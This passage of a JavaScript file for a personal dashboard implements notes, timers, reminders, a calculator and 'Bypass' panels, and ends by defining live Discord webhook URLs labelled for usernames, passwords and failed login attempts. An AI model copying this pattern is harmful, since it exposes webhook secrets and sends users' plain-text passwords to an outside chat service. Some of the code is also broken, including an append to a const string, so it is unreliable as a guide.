                        let y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;
                        target.style.transform = `translate(${x}px, ${y}px)`;
                        target.setAttribute('data-x', x);
                        target.setAttribute('data-y', y);
                    },
                    end: (event) => {
                        addActivityLog('Panel Moved', `Panel ${event.target.id} moved.`);
                    }
                }
            });
        */
        addActivityLog('UI Feature', 'Panel resizing enabled via CSS. Drag & drop not fully implemented.');
      },


      // Handle Dashboard Search
      handleDashboardSearch: function() {
          const query = document.getElementById('dashboardSearchInput').value.toLowerCase();
          if (!query) {
              this.displayAlert("Please enter a search query.", "warning");
              return;
          }

          // Search logic - target sections or panels
          const targetElement = document.getElementById(query); // Try exact ID match
          if (targetElement) {
              targetElement.scrollIntoView({ behavior: 'smooth' });
              targetElement.style.border = '2px solid yellow'; // Highlight
              setTimeout(() => targetElement.style.border = '', 3000);
              this.displayAlert(`Found and scrolled to: ${query}`, "success");
              addActivityLog('Dashboard Search', `Searched for "${query}" - Found exact match.`);
              return;
          }

          const sections = document.querySelectorAll('.info-panel, .box, #canvasContainer');
          let found = false;
          for (let section of sections) {
              // Check title, then content
              const title = section.querySelector('h2');
              const content = section.textContent;

              if ((title && title.textContent.toLowerCase().includes(query)) || content.toLowerCase().includes(query)) {
                  section.scrollIntoView({ behavior: 'smooth' });
                  section.style.border = '2px solid yellow'; // Highlight
                  setTimeout(() => section.style.border = '', 3000);
                  if (section.style.display === 'none') { // Automatically open if closed
                    section.style.display = 'block';
                  }
                  this.displayAlert(`Found result for "${query}" in section: ${title ? title.textContent : section.id}`, "success");
                  addActivityLog('Dashboard Search', `Searched for "${query}" - Found in ${section.id}.`);
                  found = true;
                  break; // Stop after first match for simplicity
              }
          }

          if (!found) {
              this.displayAlert(`No matching sections found for: "${query}"`, "warning");
              addActivityLog('Dashboard Search', `Searched for "${query}" - No match found.`);
          }
      },

      downloadActivityLogs: function() {
        if (dashboardData.activityLog.length === 0) {
            this.displayAlert('No activity logs to download.', 'warning');
            addActivityLog('Action: Download Activity Logs', 'No logs available.');
            return;
        }
        const logContent = dashboardData.activityLog.join('\n');
        const blob = new Blob([logContent], { type: 'text/plain;charset=utf-8' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `dashboard_activity_logs_${new Date().toISOString().slice(0, 10)}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        this.displayAlert('Activity logs downloaded successfully!', 'success');
        addActivityLog('Action: Download Activity Logs', 'Logs exported as TXT file.');
      },
      
      // Initialize canvas
      initCanvas: function() {
        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        const clearCanvasBtn = document.getElementById('clearCanvasBtn');
        const closeCanvasBtn = document.getElementById('closeCanvasBtn');
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');

        // Drawing properties
        ctx.fillStyle = '#fff';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.lineJoin = 'round';
        ctx.lineCap = 'round';

        let drawing = false;
        let lastX = 0;
        let lastY = 0;

        // Undo/Redo setup
        function saveState() {
            dashboardData.notes.history.splice(dashboardData.notes.historyIndex + 1); // Clear future history
            dashboardData.notes.history.push(canvas.toDataURL());
            dashboardData.notes.historyIndex = dashboardData.notes.history.length - 1;
            addActivityLog('Notes Canvas', 'State saved for undo/redo.');
        }

        function restoreState(index) {
            if (index < 0 || index >= dashboardData.notes.history.length) return;
            const img = new Image();
            img.src = dashboardData.notes.history[index];
            img.onload = () => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0);
            };
            addActivityLog('Notes Canvas', 'State restored.');
        }
        saveState(); // Save initial blank state

        function getPos(evt) {
            const rect = canvas.getBoundingClientRect();
            return {
                x: (evt.clientX || evt.touches[0].clientX) - rect.left,
                y: (evt.clientY || evt.touches[0].clientY) - rect.top
            };
        }

        function startDrawing(e) {
            drawing = true;
            [lastX, lastY] = [getPos(e).x, getPos(e).y];
            ctx.beginPath();
            ctx.moveTo(lastX, lastY);
            e.preventDefault();
        }

        function draw(e) {
            if (!drawing || dashboardData.notes.drawingMode === 'text') return;
            const currentPos = getPos(e);

            ctx.lineTo(currentPos.x, currentPos.y);
            ctx.strokeStyle = document.getElementById('noteColorPicker').value;
            ctx.lineWidth = document.getElementById('noteThicknessSlider').value;

            const material = document.getElementById('noteMaterialSelect').value;
            if (material === 'pencil') {
                ctx.globalAlpha = 0.8;
            } else if (material === 'watercolor') {
                ctx.globalAlpha = 0.2; // Semi-transparent
            } else { // 'solid'
                ctx.globalAlpha = 1.0;
            }
            ctx.stroke();

            // Store current stroke segment for custom materials like watercolor
            dashboardData.notes.currentPath.push({x: currentPos.x, y: currentPos.y, alpha: ctx.globalAlpha});

            [lastX, lastY] = [currentPos.x, currentPos.y];
            e.preventDefault();
        }

        function endDrawing() {
            if (!drawing) return;
            drawing = false;
            saveState(); // Save after each completed stroke
            ctx.closePath(); // Ensure path is closed before potentially reusing context
            ctx.globalAlpha = 1.0; // Reset alpha for next draw
            dashboardData.notes.currentPath = [];
        }

        canvas.addEventListener('mousedown', startDrawing);
        canvas.addEventListener('touchstart', startDrawing);
        canvas.addEventListener('mousemove', draw);
        canvas.addEventListener('touchmove', draw);
        canvas.addEventListener('mouseup', endDrawing);
        canvas.addEventListener('mouseleave', endDrawing);
        canvas.addEventListener('touchend', endDrawing);
        canvas.addEventListener('touchcancel', endDrawing);

        clearCanvasBtn.addEventListener('click', () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#fff';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            saveState(); // Save blank state after clearing
            this.trackStats('canvasCleared');
            addActivityLog('Notes Canvas', 'Canvas cleared.');
        });

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none'; // Hide main grid elements
          canvasContainer.style.display = 'block';
          addActivityLog('Panel Toggle', 'Notes Canvas opened.');
        });

        closeCanvasBtn.addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex'; // Restore main grid
          addActivityLog('Panel Toggle', 'Notes Canvas closed.');
        });
        
        // Export / Screenshot
        document.getElementById('screenshotBtn').addEventListener('click', () => this.takeScreenshot()); // Original screenshot functionality
        document.getElementById('exportNotesBtn').addEventListener('click', () => this.exportCanvasAsImage()); // Export canvas image

        // Notes Controls (D5)
        document.getElementById('noteThicknessSlider').addEventListener('input', (e) => {
            ctx.lineWidth = e.target.value;
            addActivityLog('Notes Control', `Brush thickness set to ${e.target.value}`);
        });
        document.getElementById('noteColorPicker').addEventListener('input', (e) => {
            ctx.strokeStyle = e.target.value;
            addActivityLog('Notes Control', `Brush color set to ${e.target.value}`);
        });
        document.getElementById('noteMaterialSelect').addEventListener('change', (e) => {
            dashboardData.notes.currentMaterial = e.target.value;
            addActivityLog('Notes Control', `Material set to ${e.target.value}`);
        });

        const textNoteInput = document.getElementById('textNoteInput');
        document.getElementById('toggleTextNotesBtn').addEventListener('click', () => {
            if (dashboardData.notes.drawingMode === 'draw') {
                dashboardData.notes.drawingMode = 'text';
                textNoteInput.style.display = 'block';
                canvas.style.cursor = 'text';
                document.getElementById('toggleTextNotesBtn').textContent = '‚úèÔ∏è Draw Mode';
                this.displayAlert('Text Notes mode enabled. Click on canvas to add text.', 'info');
                addActivityLog('Notes Control', 'Text notes mode enabled.');
            } else {
                dashboardData.notes.drawingMode = 'draw';
                textNoteInput.style.display = 'none';
                canvas.style.cursor = 'crosshair';
                document.getElementById('toggleTextNotesBtn').textContent = 'üìù Text Notes';
                this.displayAlert('Draw mode enabled.', 'info');
                addActivityLog('Notes Control', 'Draw mode enabled.');
            }
        });

        canvas.addEventListener('click', (e) => {
            if (dashboardData.notes.drawingMode === 'text' && textNoteInput.value) {
                const text = textNoteInput.value;
                const pos = getPos(e);
                ctx.font = `${document.getElementById('noteThicknessSlider').value * 2}px Arial`;
                ctx.fillStyle = document.getElementById('noteColorPicker').value;
                ctx.fillText(text, pos.x, pos.y);
                textNoteInput.value = '';
                saveState();
                addActivityLog('Notes Canvas', `Text note "${text}" added.`);
            }
        });

        document.getElementById('undoNotesBtn').addEventListener('click', () => {
            if (dashboardData.notes.historyIndex > 0) {
                dashboardData.notes.historyIndex--;
                restoreState(dashboardData.notes.historyIndex);
                addActivityLog('Notes Canvas', 'Undo action performed.');
            } else {
                this.displayAlert('Nothing to undo.', 'warning');
            }
        });

        document.getElementById('redoNotesBtn').addEventListener('click', () => {
            if (dashboardData.notes.historyIndex < dashboardData.notes.history.length - 1) {
                dashboardData.notes.historyIndex++;
                restoreState(dashboardData.notes.historyIndex);
                addActivityLog('Notes Canvas', 'Redo action performed.');
            } else {
                this.displayAlert('Nothing to redo.', 'warning');
            }
        });

        document.getElementById('saveNotesBtn').addEventListener('click', () => {
            localStorage.setItem('notesCanvasState', canvas.toDataURL());
            this.displayAlert('Notes saved locally!', 'success');
            addActivityLog('Notes Canvas', 'Notes saved to local storage.');
        });

        document.getElementById('loadNotesBtn').addEventListener('click', () => {
            const savedState = localStorage.getItem('notesCanvasState');
            if (savedState) {
                const img = new Image();
                img.src = savedState;
                img.onload = () => {
                    ctx.clearRect(0, 0, canvas.width, canvas.height);
                    ctx.drawImage(img, 0, 0);
                    saveState(); // Add loaded state to undo history
                    this.displayAlert('Notes loaded from local storage!', 'success');
                    addActivityLog('Notes Canvas', 'Notes loaded from local storage.');
                };
            } else {
                this.displayAlert('No saved notes found.', 'warning');
                addActivityLog('Notes Canvas', 'Attempted to load notes, none found.');
            }
        });

        document.getElementById('printNotesBtn').addEventListener('click', () => {
            const dataUrl = canvas.toDataURL();
            const windowContent = '<!DOCTYPE html>';
            windowContent += '<html>';
            windowContent += '<head><title>Print Notes</title></head>';
            windowContent += '<body>';
            windowContent += '<img src="' + dataUrl + '" style="max-width: 100%;"></body>';
            windowContent += '</html>';
            const printWindow = window.open('', '', 'width=800,height=600');
            printWindow.document.open();
            printWindow.document.write(windowContent);
            printWindow.document.close();
            printWindow.focus();
            printWindow.print();
            addActivityLog('Notes Canvas', 'Notes printed.');
        });
      },

      takeScreenshot: function() {
        const elementToCapture = document.body;
        html2canvas(elementToCapture).then(canvasImg => {
          const link = document.createElement('a');
          link.download = `dashboard_screenshot_${new Date().toISOString().slice(0, 10)}.png`;
          link.href = canvasImg.toDataURL('image/png');
          document.body.appendChild(link); // Append temporarily to trigger click
          link.click();
          document.body.removeChild(link); // Remove after click
          this.displayAlert('Screenshot saved successfully!', 'success');
          addActivityLog('Action: Screenshot', 'Page screenshot taken.');
        });
      },

      exportCanvasAsImage: function() {
        const canvas = document.getElementById('notesCanvas');
        const link = document.createElement('a');
        link.download = `notes_canvas_${new Date().toISOString().slice(0, 10)}.png`;
        link.href = canvas.toDataURL('image/png');
        document.body.appendChild(link); // Append temporarily to trigger click
        link.click();
        document.body.removeChild(link); // Remove after click
        this.displayAlert('Notes canvas exported as image!', 'success');
        addActivityLog('Notes Canvas', 'Canvas exported as PNG image.');
      },

      toggleMainSections: function() {
          const mainGrid = document.getElementById('mainGrid');
          const updatesNotifications = document.getElementById('updatesNotifications');
          const toggleBtn = document.getElementById('toggleSectionsBtn');

          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'flex';
            updatesNotifications.style.display = 'flex';
            toggleBtn.innerHTML = '‚¨ÜÔ∏è Toggle Main Sections';
            addActivityLog('Panel Toggle', 'Main Sections (Calendar, Updates, etc.) revealed.');
          } else {
            mainGrid.style.display = 'none';
            updatesNotifications.style.display = 'none';
            toggleBtn.innerHTML = '‚¨áÔ∏è Toggle Main Sections';
            addActivityLog('Panel Toggle', 'Main Sections (Calendar, Updates, etc.) hidden.');
          }
      },
      
      // Initial Panels State
      initPanels: function() {
        // Hide all general info panels by default
        document.querySelectorAll('.info-panel, .settings-panel, .dashboard-quick-actions-panel, .activity-log-panel, .login-history-panel, .keybinds-panel, .themes-panel, #calculatorPanel, #unitConverterPanel, #timeToolsPanel, .stats-panel, .media-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        // Hide specific content within nested panels
        document.querySelectorAll('.ipad-content, .bypass-content').forEach(content => {
          content.style.display = 'none';
        });
      },
      
      // Panel toggle functions
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const isOpen = panel.style.display === 'block';

        // Close all other panels if needed for single panel view
        document.querySelectorAll('.info-panel, .settings-panel, .dashboard-quick-actions-panel, .activity-log-panel, .login-history-panel, .keybinds-panel, .themes-panel, #calculatorPanel, #unitConverterPanel, #timeToolsPanel, .stats-panel, .media-panel').forEach(p => {
            if (p.id !== panelId) p.style.display = 'none';
        });

        panel.style.display = isOpen ? 'none' : 'block';
        
        const action = isOpen ? 'Closed' : 'Opened';
        addActivityLog('Panel Toggle', `${action} panel: ${panelId}`);
        if (!isOpen) this.trackStats('panelsOpened');
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        addActivityLog('iPad Content View', `Viewed ${contentId} on iPad panel.`);
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        addActivityLog('Bypass Content View', `Viewed ${contentId} on Bypass panel.`);
      },

      // Random Fact & Daily Quote (D11)
      initRandomFacts: function() {
          const facts = [
              "A group of owls is called a parliament.",
              "Honey never spoils.",
              "There are more trees on Earth than stars in the Milky Way.",
              "The shortest war in history lasted only 38 minutes.",
              "Butterflies taste with their feet."
          ];
          let lastFactIndex = -1;

          this.displayRandomFact = () => {
              let newIndex;
              do {
                  newIndex = Math.floor(Math.random() * facts.length);
              } while (newIndex === lastFactIndex && facts.length > 1); // Avoid repeating the same fact immediately
              document.getElementById('factContent').textContent = facts[newIndex];
              lastFactIndex = newIndex;
              addActivityLog('Content Update', 'Displayed new random fact.');
          };
          this.displayRandomFact();
      },

      initDailyQuotes: function() {
          const quotes = [
              "The only way to do great work is to love what you do. ‚Äì Steve Jobs",
              "Believe you can and you're halfway there. ‚Äì Theodore Roosevelt",
              "The future belongs to those who believe in the beauty of their dreams. ‚Äì Eleanor Roosevelt",
              "Strive not to be a success, but rather to be of value. ‚Äì Albert Einstein",
              "The mind is everything. What you think you become. ‚Äì Buddha"
          ];
          let lastQuoteIndex = -1;

          this.displayDailyQuote = () => {
              let newIndex;
              do {
                  newIndex = Math.floor(Math.random() * quotes.length);
              } while (newIndex === lastQuoteIndex && quotes.length > 1); // Avoid repeating the same quote immediately
              document.getElementById('quoteContent').textContent = quotes[newIndex];
              lastQuoteIndex = newIndex;
              addActivityLog('Content Update', 'Displayed new daily quote.');
          };
          this.displayDailyQuote();
      },

      // Keybinds (D6)
      initKeybinds: function() {
          document.addEventListener('keydown', (e) => {
              // Only trigger if not typing in an input field
              if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;

              const key = e.key.toUpperCase();
              if (dashboardData.activeKeybinds[key]) {
                  e.preventDefault(); // Prevent default browser action for bound keys
                  const targetButtonId = dashboardData.activeKeybinds[key];
                  const targetButton = document.getElementById(targetButtonId);
                  if (targetButton) {
                      targetButton.click();
                      this.displayAlert(`Keybind: '${key}' activated '${targetButton.textContent}'`, 'info');
                      addActivityLog('Keybind Activated', `Key "${key}" pressed for "${targetButtonId}"`);
                  }
              }
          });
      },

      addNewKeybind: function() {
          const action = prompt("Enter action (e.g., 'open help', 'toggle notifications'):");
          if (!action) return;
          const key = prompt("Press a key for this action:").toUpperCase();
          if (key && !dashboardData.activeKeybinds[key]) {
              dashboardData.activeKeybinds[key] = action; // For this simple example, just store action string
              const keybindsList = document.getElementById('keybindsList');
              const newEntry = document.createElement('div');
              newEntry.classList.add('keybind-entry');
              newEntry.innerHTML = `<span class="keybind-action">${action}</span> <span class="keybind-key">${key}</span>`;
              keybindsList.appendChild(newEntry);
              this.displayAlert(`Keybind '${key}' added for '${action}'`, 'success');
              addActivityLog('Keybind Added', `Keybind for "${action}" set to "${key}"`);
          } else if (key) {
              this.displayAlert(`Key '${key}' is already assigned or invalid.`, 'warning');
          }
      },

      // Timer, Stopwatch, Reminders (D7, D15)
      initTimeTools: function() {
          // Timer
          let timerInterval;
          let timerSecondsLeft = 0;
          const timerDisplay = document.getElementById('timerDisplay');
          const timerInputMinutes = document.getElementById('timerInputMinutes');

          this.startTimer = () => {
              if (!timerSecondsLeft) {
                  const minutes = parseInt(timerInputMinutes.value, 10);
                  if (isNaN(minutes) || minutes <= 0) {
                      this.displayAlert("Please enter a valid number of minutes for the timer.", 'warning');
                      return;
                  }
                  timerSecondsLeft = minutes * 60;
                  addActivityLog('Timer Action', `Timer set for ${minutes} minutes.`);
              }
              if (timerSecondsLeft > 0 && !timerInterval) {
                  timerInterval = setInterval(() => {
                      timerSecondsLeft--;
                      this.updateTimerDisplay();
                      if (timerSecondsLeft <= 0) {
                          clearInterval(timerInterval);
                          timerInterval = null;
                          timerDisplay.textContent = "00:00:00";
                          this.displayAlert("Timer finished!", 'important');
                          addActivityLog('Timer Action', 'Timer finished.');
                      }
                  }, 1000);
                  this.displayAlert("Timer started!", 'info');
                  this.trackStats('timeToolStarts');
                  addActivityLog('Timer Action', 'Timer started.');
              }
          };

          this.pauseTimer = () => {
              clearInterval(timerInterval);
              timerInterval = null;
              this.displayAlert("Timer paused.", 'info');
              addActivityLog('Timer Action', 'Timer paused.');
          };

          this.resetTimer = () => {
              clearInterval(timerInterval);
              timerInterval = null;
              timerSecondsLeft = 0;
              timerDisplay.textContent = "00:00:00";
              timerInputMinutes.value = "";
              this.displayAlert("Timer reset.", 'info');
              this.trackStats('timeToolResets');
              addActivityLog('Timer Action', 'Timer reset.');
          };

          this.updateTimerDisplay = () => {
              const h = String(Math.floor(timerSecondsLeft / 3600)).padStart(2, '0');
              const m = String(Math.floor((timerSecondsLeft % 3600) / 60)).padStart(2, '0');
              const s = String(timerSecondsLeft % 60).padStart(2, '0');
              timerDisplay.textContent = `${h}:${m}:${s}`;
          };


          // Stopwatch
          let stopwatchInterval;
          let stopwatchTime = 0;
          const stopwatchDisplay = document.getElementById('stopwatchDisplay');

          this.startStopwatch = () => {
              if (!stopwatchInterval) {
                  stopwatchInterval = setInterval(() => {
                      stopwatchTime++;
                      this.updateStopwatchDisplay();
                  }, 1000);
                  this.displayAlert("Stopwatch started!", 'info');
                  this.trackStats('timeToolStarts');
                  addActivityLog('Stopwatch Action', 'Stopwatch started.');
              }
          };

          this.pauseStopwatch = () => {
              clearInterval(stopwatchInterval);
              stopwatchInterval = null;
              this.displayAlert("Stopwatch paused.", 'info');
              addActivityLog('Stopwatch Action', 'Stopwatch paused.');
          };

          this.resetStopwatch = () => {
              clearInterval(stopwatchInterval);
              stopwatchInterval = null;
              stopwatchTime = 0;
              stopwatchDisplay.textContent = "00:00:00";
              this.displayAlert("Stopwatch reset.", 'info');
              this.trackStats('timeToolResets');
              addActivityLog('Stopwatch Action', 'Stopwatch reset.');
          };

          this.updateStopwatchDisplay = () => {
              const h = String(Math.floor(stopwatchTime / 3600)).padStart(2, '0');
              const m = String(Math.floor((stopwatchTime % 3600) / 60)).padStart(2, '0');
              const s = String(stopwatchTime % 60).padStart(2, '0');
              stopwatchDisplay.textContent = `${h}:${m}:${s}`;
          };

          // Reminders
          const reminderTextInput = document.getElementById('reminderTextInput');
          const reminderTimeInput = document.getElementById('reminderTimeInput');
          const reminderList = document.getElementById('reminderList');
          let reminders = [];

          function saveReminders() {
              localStorage.setItem('dashboardReminders', JSON.stringify(reminders));
          }

          function loadReminders() {
              const savedReminders = localStorage.getItem('dashboardReminders');
              if (savedReminders) {
                  reminders = JSON.parse(savedReminders);
                  reminders.forEach(r => {
                      r.time = new Date(r.time); // Convert time string back to Date object
                      scheduleReminderCheck(r);
                  });
              }
              this.updateReminderListDisplay();
          }

          function scheduleReminderCheck(reminder) {
              const now = new Date();
              const delay = reminder.time.getTime() - now.getTime();
              if (delay > 0) {
                  setTimeout(() => {
                      dashboard.displayAlert(`üîî Reminder: ${reminder.text}`, 'important');
                      dashboard.removeReminder(reminder.id); // Remove after alerting
                      addActivityLog('Reminder Triggered', `Reminder "${reminder.text}" triggered.`);
                  }, delay);
              } else {
                  // If reminder time is in the past, remove it, unless explicitly kept.
                  dashboard.displayAlert(`üîî Missed Reminder (Past): ${reminder.text}`, 'important');
                  dashboard.removeReminder(reminder.id);
                  addActivityLog('Reminder Triggered', `Past Reminder "${reminder.text}" triggered and removed.`);
              }
          }

          this.addReminder = () => {
              const text = reminderTextInput.value.trim();
              const time = new Date(reminderTimeInput.value);
              const now = new Date();

              if (!text || isNaN(time.getTime())) {
                  this.displayAlert("Please enter both reminder text and a valid future date/time.", 'warning');
                  return;
              }
              if (time <= now) {
                  this.displayAlert("Reminder time must be in the future.", 'warning');
                  return;
              }

              const newReminder = {
                  id: Date.now(),
                  text,
                  time
              };
              reminders.push(newReminder);
              saveReminders();
              scheduleReminderCheck(newReminder);
              this.updateReminderListDisplay();
              this.displayAlert('Reminder added successfully!', 'success');
              this.trackStats('remindersSet');
              addActivityLog('Reminder Action', `Added reminder: "${text}" at ${time.toLocaleString()}.`);

              reminderTextInput.value = '';
              reminderTimeInput.value = '';
          };

          this.removeReminder = (id) => {
              const index = reminders.findIndex(r => r.id === id);
              if (index !== -1) {
                  const removedReminder = reminders.splice(index, 1)[0];
                  saveReminders();
                  this.updateReminderListDisplay();
                  this.displayAlert('Reminder removed.', 'info');
                  addActivityLog('Reminder Action', `Removed reminder: "${removedReminder.text}".`);
              }
          };

          this.updateReminderListDisplay = () => {
              reminderList.innerHTML = '';
              if (reminders.length === 0) {
                  const p = document.createElement('p');
                  p.textContent = 'No reminders set yet.';
                  reminderList.appendChild(p);
                  return;
              }
              reminders.sort((a, b) => a.time.getTime() - b.time.getTime()); // Sort by time
              reminders.forEach(r => {
                  const entry = document.createElement('div');
                  entry.classList.add('reminder-entry');
                  entry.innerHTML = `
                      <span>${r.time.toLocaleString()}: ${r.text}</span>
                      <button class="close-btn" onclick="dashboard.removeReminder(${r.id})">‚úñÔ∏è</button>
                  `;
                  reminderList.appendChild(entry);
              });
          };

          // Load reminders on init
          loadReminders.call(this); // Call with 'this' to bind to dashboard context
      },

      // Calculator (D12)
      initCalculator: function() {
        const display = document.getElementById('calcDisplay');
        let currentInput = '0';
        let previousInput = '';
        let operation = null;
        let waitingForSecondOperand = false;

        function updateDisplay() {
            display.textContent = currentInput;
        }

        this.appendCalc = (number) => {
            if (currentInput === '0' || waitingForSecondOperand) {
                currentInput = number;
                waitingForSecondOperand = false;
            } else {
                currentInput += number;
            }
            updateDisplay();
        };

        this.clearCalc = () => {
            currentInput = '0';
            previousInput = '';
            operation = null;
            waitingForSecondOperand = false;
            updateDisplay();
            addActivityLog('Calculator Action', 'Calculator cleared.');
        };

        this.chooseCalcOperation = (op) => {
            if (currentInput === '0' && previousInput === '') {
                operation = op; // Allows setting operation before first number
                addActivityLog('Calculator Action', `Operation chosen: ${op}`);
                return;
            }

            if (previousInput !== '' && !waitingForSecondOperand) {
                this.calculateResult();
            }
            operation = op;
            previousInput = currentInput;
            waitingForSecondOperand = true;
            addActivityLog('Calculator Action', `Operation chosen: ${op}`);
        };

        this.calculateResult = () => {
            if (!operation || previousInput === '' || currentInput === '') return;

            let result;
            const prev = parseFloat(previousInput);
            const current = parseFloat(currentInput);

            if (isNaN(prev) || isNaN(current)) return;

            switch (operation) {
                case '+': result = prev + current; break;
                case '-': result = prev - current; break;
                case '*': result = prev * current; break;
                case '/': result = prev / current; break;
                default: return;
            }
            currentInput = result.toString();
            operation = null;
            previousInput = '';
            waitingForSecondOperand = false;
            updateDisplay();
            this.trackStats('calculatorOperations');
            addActivityLog('Calculator Action', `Calculation: ${prev} ${operation} ${current} = ${result}`);
        };
        updateDisplay();
      },

      // Unit Converter (D12)
      initUnitConverter: function() {
        const convertValueInput = document.getElementById('convertValue');
        const convertFromUnitSelect = document.getElementById('convertFromUnit');
        const convertToUnitSelect = document.getElementById('convertToUnit');
        const conversionResultSpan = document.getElementById('conversionResult');

        // Conversion rates relative to a base unit (e.g., meter for length, kg for mass)
        const conversions = {
            length: {
                cm: 0.01, m: 1, km: 1000, inch: 0.0254, ft: 0.3048 // meters
            },
            mass: {
                lb: 0.453592, kg: 1 // kilograms
            }
        };

        function getUnitType(unit) {
            if (['cm', 'm', 'km', 'inch', 'ft'].includes(unit)) return 'length';
            if (['lb', 'kg'].includes(unit)) return 'mass';
            return null;
        }

        this.convertUnits = () => {
            const value = parseFloat(convertValueInput.value);
            const fromUnit = convertFromUnitSelect.value;
            const toUnit = convertToUnitSelect.value;

            if (isNaN(value)) {
                this.displayAlert("Please enter a valid number to convert.", 'warning');
                return;
            }

            const fromType = getUnitType(fromUnit);
            const toType = getUnitType(toUnit);

            if (!fromType || !toType || fromType !== toType) {
                this.displayAlert("Incompatible unit types for conversion.", 'warning');
                conversionResultSpan.textContent = 'Error';
                addActivityLog('Unit Converter Error', 'Incompatible unit types.');
                return;
            }

            // Convert to base unit
            const valueInBase = value * conversions[fromType][fromUnit];
            // Convert from base unit to target unit
            const result = valueInBase / conversions[toType][toUnit];

            conversionResultSpan.textContent = result.toFixed(4) + ' ' + toUnit;
            this.displayAlert('Conversion successful!', 'success');
            this.trackStats('unitConversions');
            addActivityLog('Unit Conversion', `${value} ${fromUnit} converted to ${result.toFixed(4)} ${toUnit}`);
        };
      },

      // Media Player (D14)
      initMedia: function() {
        const youtubeUrlInput = document.getElementById('youtubeUrlInput');
        const youtubeEmbed = document.getElementById('youtubeEmbed');
        const youtubeEmbedBaseUrl = 'https://www.youtube.com/embed/'; // To bypass restrictions, this would be your proxy

        this.loadYoutubeVideo = () => {
            const input = youtubeUrlInput.value.trim();
            let videoId;

            // Extract YouTube video ID
            const youtubeRegex = /(?:youtube\.com\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|\S*?[?&]v=)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
            const match = input.match(youtubeRegex);
            
            if (match && match[1]) {
                videoId = match[1];
            } else if (input.length === 11) { // Assume it's a direct video ID
                videoId = input;
            } else {
                this.displayAlert('Invalid YouTube video URL or ID. Please enter a valid one.', 'warning');
                addActivityLog('Media Player Error', 'Invalid YouTube URL/ID entered.');
                return;
            }

            const embedSrc = `${youtubeEmbedBaseUrl}${videoId}?autoplay=1`; // Autoplay is often blocked
            youtubeEmbed.src = embedSrc;
            this.displayAlert(`Loading YouTube video: ${videoId}`, 'info');
            addActivityLog('Media Player Action', `Loaded YouTube video: ${videoId}`);
        };
      },

      // Login History (D9)
      loadLoginHistory: function() {
          const loginHistoryList = document.getElementById('loginHistoryList');
          loginHistoryList.innerHTML = '';
          const storedLoginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];

          // Also get the very last login that happens just before logging out (from login.js, stored in 'lastLogin')
          const lastLoginData = JSON.parse(localStorage.getItem('lastLogin'));
          if (lastLoginData && storedLoginHistory.length === 0 || 
             (storedLoginHistory.length > 0 && storedLoginHistory[0].time !== lastLoginData.time)) {
             storedLoginHistory.unshift(lastLoginData); // Add to the top
             if (storedLoginHistory.length > 10) storedLoginHistory.pop(); // Keep history manageable
             localStorage.setItem('loginHistory', JSON.stringify(storedLoginHistory)); // Save back updated history
             localStorage.removeItem('lastLogin'); // Clear lastLogin after adding to history
          }
          

          if (storedLoginHistory.length === 0) {
              const li = document.createElement('li');
              li.textContent = 'No login history available.';
              loginHistoryList.appendChild(li);
          } else {
              storedLoginHistory.forEach(entry => {
                  const li = document.createElement('li');
                  li.textContent = `User: ${entry.user}, ID: ${entry.id}, Time: ${entry.time}`;
                  loginHistoryList.appendChild(li);
              });
          }
      },
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHoIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
